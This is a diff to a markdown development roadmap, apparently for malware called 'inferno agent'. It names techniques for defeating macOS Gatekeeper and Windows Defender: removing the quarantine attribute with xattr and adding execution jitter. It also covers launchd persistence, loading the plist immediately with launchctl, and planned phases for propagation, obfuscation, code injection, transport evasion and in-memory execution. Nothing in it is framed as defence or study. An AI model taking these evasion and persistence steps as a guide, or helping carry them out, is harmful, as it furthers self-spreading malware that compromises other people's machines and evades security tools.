@@ -14,7 +14,6 @@
 | **Quarantine removal** | macOS | Call `xattr -dr com.apple.quarantine` on extracted agent before `execv` — prevents Gatekeeper prompt for the child binary |
 | **Execution jitter** | Both | Add random 5–15s `sleep` between `extractAgent` and `runAgent` — breaks write-then-execute heuristics in Windows Defender / macOS Gatekeeper |
 | **Error visibility** | Both | Log `GetLastError()` / `strerror(errno)` on directory/file creation failures — debug why a path was rejected |
-| **Plist auto-load** | macOS | Add `launchctl bootstrap gui/$UID` call after writing plist — activates persistence immediately without requiring logout/login |
 
 ---
 
@@ -27,8 +26,6 @@
 - [✓] Pass server IP/port to persistence so launchd re-launches with correct args
 - [✓] Unique plist label (`com.inferno.agent`) to avoid collision
 - [✓] `KeepAlive` true — auto-restart on crash
-
-**Remaining**: Immediately load the plist so persistence starts in the current session, not after next login.
 
 ---
 
@@ -183,11 +180,15 @@ Phase 0 (Wrapper hardening) → Phase 1 (Client evasion)
      ↓
 Phase 2 (Basic propagation)
      ↓
-Phase 3 (Obfuscation) ──────→ Phase 5 (Transport evasion)
-     ↓                            ↓
-Phase 4 (Injection) ────────→ Phase 6 (In-memory execution)
-     ↓                            ↓
-Phase 7 (Evasive propagation) ←──┘
+Phase 3 (Obfuscation) ──────────→ Phase 5 (Transport evasion)
+     ↓
+Phase 4 (Injection) ───────────→ Phase 6 (In-memory execution)
+     │                                │
+     │                                │
+     ├──────── Phase 7 ←──────────────┘
+     │           (Evasive propagation)
+     │                ↑
+     └──────── Phase 5 (Transport evasion required)
      ↓
 Phase 8 (Auth & persistence)
      ↓
